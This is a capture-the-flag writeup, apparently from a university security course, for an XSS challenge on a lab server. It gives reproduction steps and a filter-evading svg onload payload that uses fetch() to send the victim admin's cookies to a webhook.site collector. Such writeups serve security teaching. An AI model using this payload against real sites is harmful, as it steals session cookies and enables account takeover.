# Challenge `Give me more than a simple WAF` writeup

- Vulnerability: XSS
- Where: `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252` 'link of the bug/feature to report' box
- Impact: Allows an attacker to inject malicious code in the webpage

## Steps to reproduce

1. Get a URL in [Webhook](https://webhook.site/) to collect your http requests
2. URL-encode the script `<svg onload=fetch("`_`<your_webhook_url>`_`?cookie="+document.cookie)></svg>`
3. Write the URL `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252/?search=`_`<url_encoded_script>`_ in the 'link of the bug/feature to report' box and click `Submit`
4. When the admin opens the link the script will be executed, sending a http request to your Webhook URL with his cookies

[(POC)](pocs/give_me_more_than_a_simple_waf_poc.py)
